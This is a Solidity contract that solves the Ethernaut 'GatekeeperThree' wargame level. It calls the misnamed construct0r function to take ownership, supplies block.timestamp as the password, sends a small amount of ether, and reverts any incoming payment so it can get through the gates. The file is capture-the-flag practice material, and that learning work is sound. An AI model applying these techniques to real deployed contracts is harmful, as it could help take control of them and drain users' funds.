// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/GatekeeperThree.sol';

contract GatekeeperThreeSolution {
  GatekeeperThree target;
  constructor(address targetAddress) payable {
    require(msg.value > 0.001 ether, "must ");
    target = GatekeeperThree(payable(targetAddress));
  }

  function exploit() public {
    target.construct0r();
    SimpleTrick trick = target.trick();
    trick.checkPassword(block.timestamp);
    target.getAllowance(block.timestamp);
    payable(address(target)).transfer(0.001 ether + 1);
    target.enter();
  }

  receive() external payable {
    revert();
  }
}